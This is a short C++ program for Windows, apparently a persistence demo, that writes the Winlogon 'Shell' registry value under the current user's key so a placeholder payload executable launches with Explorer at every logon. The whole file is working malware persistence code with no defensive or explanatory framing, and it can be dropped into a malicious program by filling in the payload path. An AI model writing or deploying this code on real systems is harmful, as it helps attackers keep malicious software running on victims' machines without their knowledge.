// Author: Nemuel Wainaina

#include <iostream>
#include <windows.h>

int main() {
    HKEY hKey;
    LONG result;

    const std::wstring payload = L"C:\\Path\\To\\Payload.exe";
    std::wstring tmp = L"explorer.exe," + payload;
    const wchar_t* sh = tmp.c_str();

    result = RegOpenKeyExW(
        HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        0, KEY_WRITE, &hKey);
    if (result == ERROR_SUCCESS) {
        result = RegSetValueExW(hKey, L"Shell", 0, REG_SZ, reinterpret_cast<const BYTE*>(sh), (wcslen(sh)+1) * sizeof(wchar_t));
        if (result == ERROR_SUCCESS) {
            std::cout << "success" << std::endl;
        } else {
            std::cout << "failed" << result << std::endl;;
        }
        RegCloseKey(hKey);
    }

    return 0;
}
